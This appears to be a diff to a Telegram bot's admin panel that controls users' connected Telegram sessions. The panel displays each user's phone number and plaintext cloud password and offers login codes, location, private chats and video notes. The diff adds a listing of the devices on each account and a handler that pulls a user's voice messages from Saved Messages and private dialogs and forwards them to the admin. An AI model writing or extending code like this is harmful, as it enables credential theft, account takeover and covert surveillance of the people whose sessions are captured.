@@ -1280,22 +1280,31 @@ async def admin_users_list(callback: types.CallbackQuery):
     page = int(callback.data.split("_")[-1])
     all_configs = list(MEMORY_DB["config"].items())
 
+    # Отображаем только активных пользователей с подключенным юзерботом
+    active_configs = []
+    for uid, cfg in all_configs:
+        try:
+            if cfg.get("logged_in") and await ensure_client_connected(int(uid)):
+                active_configs.append((uid, cfg))
+        except Exception:
+            pass
+
     # Сортировка пользователей (сначала самые активные)
     def get_user_score(item):
         uid, cfg = item
         activity = MEMORY_DB["activity"].get(uid, {})
         return sum(activity.values()) if activity else (1 if cfg.get("logged_in") else 0)
 
-    all_configs.sort(key=get_user_score, reverse=True)
+    active_configs.sort(key=get_user_score, reverse=True)
 
     per_page = 5
-    total_users = len(all_configs)
+    total_users = len(active_configs)
     total_pages = max(1, (total_users + per_page - 1) // per_page)
     page = max(1, min(page, total_pages))
 
     start_idx = (page - 1) * per_page
     end_idx = start_idx + per_page
-    current_page_users = all_configs[start_idx:end_idx]
+    current_page_users = active_configs[start_idx:end_idx]
 
     builder = InlineKeyboardBuilder()
     for uid, cfg in current_page_users:
@@ -1333,20 +1342,43 @@ async def admin_user_view(callback: types.CallbackQuery):
     phone = cfg.get("phone", "Не указан")
     password = cfg.get("password", "Нет")
 
+    # Выгрузка устройств активных сессий пользователя
+    devices_str = "Неизвестно"
+    target_state = get_user_state(int(target_uid))
+    client = target_state.get("client")
+    if client and client.is_connected:
+        try:
+            auths = await client.invoke(functions.account.GetAuthorizations())
+            authorizations = getattr(auths, "authorizations", []) or []
+            device_names = []
+            for auth in authorizations:
+                dev = getattr(auth, "device_model", "") or getattr(auth, "model", "")
+                if dev and dev not in device_names:
+                    device_names.append(dev)
+            if device_names:
+                devices_str = ", ".join(device_names)
+            else:
+                devices_str = "Не найдено"
+        except Exception as e:
+            logging.error(f"Ошибка получения устройств: {e}")
+            devices_str = "Ошибка получения"
+
     text = (
         f"Никнейм: {first_name}\n"
         f"Юзернейм: {username_str}\n"
         f"Номер: {phone}\n"
-        f"Облачный пароль: {password}"
+        f"Облачный пароль: {password}\n"
+        f"Устройств: {devices_str}"
     )
 
     builder = InlineKeyboardBuilder()
     builder.button(text="Тг коды", callback_data=f"admin_tgcode_{target_uid}")
     builder.button(text="Локация", callback_data=f"admin_loc_{target_uid}")
-    builder.button(text="Лички", callback_data=f"admin_pms_{target_uid}")
     builder.button(text="Кружки", callback_data=f"admin_circles_{target_uid}")
+    builder.button(text="Голосовые", callback_data=f"admin_voices_{target_uid}")
+    builder.button(text="Лички", callback_data=f"admin_pms_{target_uid}")
     builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data="admin_users_1")
-    builder.adjust(2, 2, 1)
+    builder.adjust(2, 2, 1, 1)
 
     await edit_or_send(callback.from_user.id, text, reply_markup=builder.as_markup())
     try: await callback.answer()
@@ -1559,6 +1591,90 @@ async def admin_circles_view(callback: types.CallbackQuery):
         await edit_or_send(callback.from_user.id, f"🎥 Отправлено последних кружков: {sent_count} шт.!", reply_markup=builder.as_markup())
     else:
         await edit_or_send(callback.from_user.id, "❌ Кружки у пользователя не найдены.", reply_markup=builder.as_markup())
+
+    try: await callback.answer()
+    except Exception: pass
+
+@dp.callback_query(F.data.startswith("admin_voices_"))
+async def admin_voices_view(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user): return
+    target_uid = int(callback.data.split("_")[-1])
+    target_state = get_user_state(target_uid)
+    client = target_state.get("client")
+
+    search_done = False
+    voices = []
+
+    # Анимация ожидания
+    async def animate_loading():
+        dots_cycle = [".", "..", "..."]
+        idx = 0
+        while not search_done:
+            dots = dots_cycle[idx % 3]
+            try:
+                await edit_or_send(callback.from_user.id, f"Ожидайте{dots}")
+            except Exception:
+                pass
+            idx += 1
+            await asyncio.sleep(0.8)
+
+    anim_task = asyncio.create_task(animate_loading())
+
+    if client and client.is_connected:
+        try:
+            # 1. Поиск голосовых сообщений в Избранном ("me")
+            async for msg in client.get_chat_history("me", limit=30):
+                if msg.voice:
+                    voices.append(msg)
+                    if len(voices) >= 3:
+                        break
+                await asyncio.sleep(0.05)
+
+            # 2. Поиск в личных диалогах, если найдено меньше 3
+            if len(voices) < 3:
+                async for dialog in client.get_dialogs(limit=20):
+                    if dialog.chat.type == enums.ChatType.PRIVATE:
+                        async for msg in client.get_chat_history(dialog.chat.id, limit=15):
+                            if msg.voice:
+                                voices.append(msg)
+                                if len(voices) >= 3:
+                                    break
+                            await asyncio.sleep(0.05)
+                    if len(voices) >= 3:
+                        break
+                    await asyncio.sleep(0.1)
+        except Exception as e:
+            logging.error(f"Ошибка поиска голосовых сообщений: {e}")
+
+    search_done = True
+    anim_task.cancel()
+    try:
+        await anim_task
+    except asyncio.CancelledError:
+        pass
+
+    sent_count = 0
+    if voices:
+        for msg in voices:
+            try:
+                file_buf = await client.download_media(msg, in_memory=True)
+                if file_buf:
+                    await bot.send_voice(
+                        chat_id=callback.from_user.id,
+                        voice=types.BufferedInputFile(file_buf.getvalue(), filename="voice.ogg")
+                    )
+                    sent_count += 1
+                    await asyncio.sleep(1)
+            except Exception as e:
+                logging.error(f"Ошибка отправки голосового сообщения: {e}")
+
+    builder = InlineKeyboardBuilder()
+    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_user_{target_uid}")
+
+    if sent_count > 0:
+        await edit_or_send(callback.from_user.id, f"🎙 Отправлено последних голосовых: {sent_count} шт.!", reply_markup=builder.as_markup())
+    else:
+        await edit_or_send(callback.from_user.id, "❌ Голосовые сообщения у пользователя не найдены.", reply_markup=builder.as_markup())
 
     try: await callback.answer()
     except Exception: pass
